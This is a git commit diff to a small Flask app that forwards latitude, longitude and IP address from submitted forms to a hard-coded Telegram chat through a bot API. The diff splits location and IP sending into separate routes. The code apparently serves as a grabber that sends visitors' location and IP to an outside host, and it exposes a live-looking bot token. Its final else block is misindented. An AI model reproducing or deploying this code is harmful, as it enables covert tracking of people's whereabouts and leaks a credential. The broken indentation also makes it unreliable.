2b03388b20d825dd7e30fef06352bc4ea2741253
gowano2022 <59827733+gowano2022@users.noreply.github.com>
2023-06-24 19:09:26 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,5 @@
+
+
 from flask import Flask, render_template, request
 import requests
 
@@ -11,20 +13,34 @@ def hello():
 def send_location():
     latitude = request.form['latitude']
     longitude = request.form['longitude']
-    ip_address = request.form['ip_address']
     
-    # Send the location and IP address to Telegram using the Telegram Bot API
+    # Send the location to Telegram using the Telegram Bot API
     bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
     chat_id = '373715044'
-    message = f"Latitude: {latitude}, Longitude: {longitude}, IP Address: {ip_address}"
+    api_url = f"https://api.telegram.org/bot{bot_token}/sendLocation?chat_id={chat_id}&latitude={latitude}&longitude={longitude}"
+    
+    response = requests.get(api_url)
+    if response.status_code == 200:
+        return 'Location sent successfully!'
+    else:
+      return 'Failed to send location.'
+
+@app.route('/send_ip', methods=['POST'])
+def send_ip():
+    # Get the IP address of the user
+    ip_address = request.form['ip_address']
+    
+    # Send the IP address to Telegram using the Telegram Bot API
+    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
+    chat_id = '373715044'
+    message = f"IP Address: {ip_address}"
     api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
     
     response = requests.get(api_url)
     if response.status_code == 200:
-        return 'Location and IP sent successfully!'
-    else:
-        return 'Failed to send location and IP.'
+       return 'IP sent successfully!'
+   else:
+       return 'Failed to send IP.'
 
 if __name__ == '__main__':
     app.run()
-	
